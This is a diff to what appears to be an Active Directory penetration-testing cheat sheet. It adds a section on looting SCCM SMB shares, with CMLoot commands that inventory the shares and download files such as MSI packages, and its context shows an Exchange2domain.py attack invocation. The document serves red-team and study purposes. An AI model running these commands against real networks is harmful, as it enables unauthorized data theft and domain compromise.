@@ -120,6 +120,7 @@
     - [PrivExchange attack](#privexchange-attack)
     - [SCCM Deployment](#sccm-deployment)
     - [SCCM Network Access Accounts](#sccm-network-access-accounts)
+    - [SCCM Shares](#sccm-shares)
     - [WSUS Deployment](#wsus-deployment)
     - [RODC - Read Only Domain Controller Compromise](#rodc---read-only-domain-controller-compromise)
     - [PXE Boot image attack](#pxe-boot-image-attack)
@@ -3741,6 +3742,17 @@ python Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th 
     Get-Acl C:\Windows\System32\wbem\Repository\OBJECTS.DATA | Format-List -Property PSPath,sddl
     ConvertFrom-SddlString ""
     ```
+
+### SCCM Shares
+
+> Find interesting files stored on (System Center) Configuration Manager (SCCM/CM) SMB shares
+
+* [1njected/CMLoot](https://github.com/1njected/CMLoot)
+  ```ps1
+  Invoke-CMLootInventory -SCCMHost sccm01.domain.local -Outfile sccmfiles.txt
+  Invoke-CMLootDownload -SingleFile \\sccm\SCCMContentLib$\DataLib\SC100001.1\x86\MigApp.xml
+  Invoke-CMLootDownload -InventoryFile .\sccmfiles.txt -Extension msi
+  ```
 
 
 ### WSUS Deployment
